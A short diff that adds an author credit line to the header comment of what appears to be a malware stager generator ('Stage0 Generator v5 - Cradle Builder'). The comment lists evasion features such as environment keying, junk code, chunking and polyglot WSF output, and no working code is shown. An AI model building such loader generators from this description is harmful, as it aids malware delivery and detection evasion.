@@ -1,5 +1,6 @@
 // ============================================================
 // Stage0 Generator v5 - Cradle Builder
+// Developped by 4rt3f4kt
 // Template-based with chunking, env keying, junk code,
 // callback execution, and polyglot WSF output.
 // ============================================================
